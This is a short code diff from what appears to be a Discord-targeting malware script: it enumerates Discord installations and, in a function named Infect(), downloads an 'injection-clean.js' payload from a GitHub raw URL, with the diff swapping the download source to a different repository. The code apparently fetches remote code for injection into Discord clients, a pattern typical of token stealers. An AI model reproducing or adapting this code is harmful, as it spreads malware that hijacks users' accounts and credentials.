@@ -41,7 +41,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/9Ruby9/r4bbit/main/injection-clean.js', (resp) => {
+    https.get('https://github.com/Max87153/jejej/raw/main/injection-clean.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
